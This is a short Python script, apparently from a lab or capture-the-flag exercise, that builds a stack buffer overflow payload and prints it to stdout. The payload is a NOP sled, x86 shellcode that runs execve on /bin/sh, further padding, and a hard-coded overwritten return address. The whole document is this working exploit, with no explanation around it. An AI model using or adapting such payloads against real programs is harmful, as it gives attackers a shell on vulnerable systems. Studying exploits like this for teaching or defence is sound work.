#!/usr/bin/python3
import sys

shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

first_padding = b'\x90' * 20
second_padding = b'\x90' * 21

eip = b'\x4e\xed\xff\xbf'

attack_buffer = first_padding + shellcode + second_padding + eip

bytes_sent = sys.stdout.buffer.write(attack_buffer)
print(bytes_sent)
